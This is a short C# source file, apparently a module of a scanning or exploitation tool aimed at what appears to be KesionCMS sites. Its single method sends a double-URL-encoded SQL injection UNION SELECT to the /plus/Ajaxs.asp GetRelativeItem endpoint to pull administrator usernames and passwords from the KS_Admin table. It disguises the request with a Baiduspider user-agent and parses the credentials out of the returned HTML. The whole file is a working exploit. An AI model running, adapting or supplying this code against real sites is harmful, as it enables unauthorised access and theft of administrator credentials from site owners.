using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class kessionms
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string exp = "/plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,username%252B%2527%257C%2527%252Bpassword%20from%20KS_Admin%2500";
				string shuju = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.Default
				}.DownloadString(urls + exp);
				int kaishi = shuju.IndexOf("<option value='1|2'>");
				int jishu = shuju.IndexOf("</option>");
				string expshujuu = shuju.Substring(kaishi + 20, jishu - kaishi - 20);
				result = expshujuu;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
